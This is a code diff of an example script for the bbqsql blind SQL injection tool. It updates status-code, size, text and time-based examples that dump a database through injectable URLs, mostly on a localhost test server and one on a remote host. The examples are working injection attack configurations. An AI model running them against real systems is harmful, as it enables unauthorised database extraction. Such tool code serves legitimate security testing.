@@ -5,52 +5,52 @@ from urllib import quote
 #REMOTE STATUS CODE BASED EXAMPLE
 '''
 url     = bbqsql.Query('http://btoe.ws:8090/error?${injection}')
-query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}&foo=${user_query:unimportant}",encoder=quote)
+query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)
 
-bh      = bbqsql.BooleanBlindSQLi(url=url,query=query,method='GET',comparison_attr='status_code')
+bh      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='status_code',technique='binary_search',concurrency=100)
 
 start = time()
-results = bh.run(concurrency=100)
+results = bh.run()
 stop = time()
 
 print "dumped db in %f seconds" % (stop-start)
 '''
 
+'''
 #STATUS CODE BASED EXAMPLE
 url     = bbqsql.Query('http://127.0.0.1:8090/error?${injection}')
-query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}&foo=${user_query:unimportant}",encoder=quote)
+query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)
 
-bh      = bbqsql.BooleanBlindSQLi(url=url,query=query,method='GET',comparison_attr='status_code')
+bh      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='status_code',technique='frequency_search',concurrency=35)
 
 start = time()
-results = bh.run(query="select user()",concurrency=35)
+results = bh.run()
 stop = time()
 
 print "dumped db in %f seconds" % (stop-start)
+'''
 
 #SIZE BASED EXAMPLE
-'''
 url     = bbqsql.Query('http://127.0.0.1:8090/boolean?${injection}')
-query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}&foo=${user_query:unimportant}",encoder=quote)
+query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)
 
-bh      = bbqsql.BooleanBlindSQLi(url=url,query=query,method='GET',comparison_attr='size')
+bh      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='size',technique='binary_search',concurrency=30)
 
 start = time()
-results = bh.run(query="select user()",concurrency=30)
+results = bh.run()
 stop = time()
 
 print "dumped db in %f seconds" % (stop-start)
-'''
 
 #TEXT BASED EXAMPLE
 '''
 url     = bbqsql.Query('http://127.0.0.1:8090/boolean?${injection}')
-query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:0}&foo=${user_query:unimportant}",encoder=quote)
+query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)
 
-bh      = bbqsql.BooleanBlindSQLi(url=url,query=query,method='GET',comparison_attr='text')
+bh      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='text',technique='frequency_search',concurrency=35)
 
 start = time()
-results = bh.run(query="select user()",concurrency=35)
+results = bh.run()
 stop = time()
 
 print "dumped db in %f seconds" % (stop-start)
@@ -59,11 +59,11 @@ print "dumped db in %f seconds" % (stop-start)
 # TIME BASED EXAMPLE
 '''
 url = bbqsql.Query('http://127.0.0.1:8090/time?${query}')
-query = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=${sleep:.2}&foo=${user_query:unimportant}",encoder=quote)
+query = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=.2",encoder=quote)
 
-bh = bbqsql.BooleanBlindSQLi(url=url,query=query,comparison_attr='time')
+bh = bbqsql.BlindSQLi(url=url,query=query,comparison_attr='time',technique='binary_search',concurrency=50)
 start = time()
-results = bh.run(concurrency=50,sleep=.2)
+results = bh.run()
 stop = time()
 
 print "dumped db in %f seconds" % (stop-start)
